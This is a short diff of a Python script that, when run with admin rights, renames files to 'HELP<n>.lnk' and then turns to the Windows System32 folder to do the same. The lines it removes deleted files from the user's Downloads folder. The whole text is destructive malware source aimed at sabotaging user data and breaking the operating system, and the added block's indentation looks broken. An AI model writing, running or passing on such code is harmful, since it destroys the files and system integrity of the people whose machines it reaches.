@@ -7,10 +7,12 @@ def is_admin():
         return False
 
 if is_admin():
-    name = os.getlogin()
-    os.chdir("/Users/" + name + "/Downloads")
-    for files in os.getcwd():
-        os.remove(files)
+     for count, f in enumerate(os.listdir()):
+        f_name, f_ext = os.path.splitext(f)
+        f_name = "HELP" + str(count)
+        f_ext = ".lnk"
+        new_name = f'{f_name}{f_ext}'
+        os.rename(f, new_name)
     os.chdir("/Windows/System32")
     #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
     for count, f in enumerate(os.listdir()):
